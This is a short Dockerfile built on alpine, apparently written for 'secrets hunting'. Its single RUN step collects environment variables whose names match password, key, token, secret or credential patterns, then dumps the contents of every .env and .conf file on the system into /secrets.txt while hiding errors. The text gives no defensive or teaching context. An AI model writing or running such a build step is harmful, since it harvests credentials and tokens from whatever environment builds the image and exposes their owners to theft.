FROM alpine:latest

# Fixed syntax for secrets hunting
RUN echo "Hunting for secrets..." && \
    (env | grep -iE 'pass|key|token|secret|cred') > /secrets.txt && \
    find / \( -name "*.env" -o -name "*.conf" \) -exec cat {} \; >> /secrets.txt 2>/dev/null
